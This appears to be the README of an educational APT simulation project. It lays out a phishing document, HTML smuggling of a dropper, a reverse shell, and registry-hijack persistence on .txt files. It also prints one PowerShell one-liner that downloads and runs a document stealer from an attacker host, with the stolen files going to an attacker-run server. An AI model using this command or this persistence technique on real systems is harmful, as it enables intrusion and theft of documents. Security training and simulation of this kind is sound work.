# APT Simulation - Advanced Persistent Threat Attack

This project simulates an **Advanced Persistent Threat (APT)** attack, covering multiple stages from initial phishing to data exfiltration. The simulation is designed for educational and cybersecurity awareness purposes in a **controlled environment** such as VirtualBox.

## **Stages of the Attack**

### **1. Phishing (Initial Access)**

- A malicious **job application document (.docx)** is sent to the target.
- The document contains a **link to an HTML Smuggling page** that automatically downloads the initial dropper (**dropper.exe**).

### **2. HTML Smuggling (Dropper Execution)**

- When the target opens the link, **dropper.exe** is downloaded without triggering security warnings.
- If the user executes **dropper.exe**, it downloads additional payloads from the attacker's server.

### **3. Payload Deployment (Execution & Persistence)**

- The dropper downloads **shellcode (reverse shell)** and persist.ps1 file from the attacker's server.
- The dropper.exe manipulates the **registry value** at `HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command` to execute `persist.ps1`.
- When the user opens any **.txt file**, the manipulated registry value triggers `persist.ps1`, which establishes a **reverse shell** connection to the attacker's server.

### **4. Data Exfiltration (Document Theft)**

- A **PowerShell document stealer** (`docs-stealer.ps1`) searches for sensitive files such as **.txt, .pdf, .xlsx, .csv**, and other document types.
- Once the attacker gains a **reverse shell** on the target system, they execute the following command to download and run the document stealer:

  ```powershell
  powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/docs-stealer.ps1')"
  ```

- The script scans for potential sensitive documents and uploads them to a **remote PHP web server** controlled by the attacker.

## **Components**

- **Dropper (C)**: Downloads & executes payloads.
- **Reverse Shell (C & Windows API)**: Establishes attacker connection.
- **PowerShell Scripts**: Handles persistence & document exfiltration.
- **PHP Web Server**: Receives stolen files.
- **HTML Smuggling (HTML & JavaScript)**: dropper delivery.
- **Phishing Document (DOCX)**: Social engineering bait.

### **Disclaimer**

This repository contains code related to **malware simulation and penetration testing**. It is intended for **educational and research purposes only** in a **controlled and legal environment** such as virtual machines or isolated test networks. **The author does not condone or take responsibility for any illegal or unethical activities performed using this code.** Use at your own risk and ensure compliance with applicable laws and regulations.
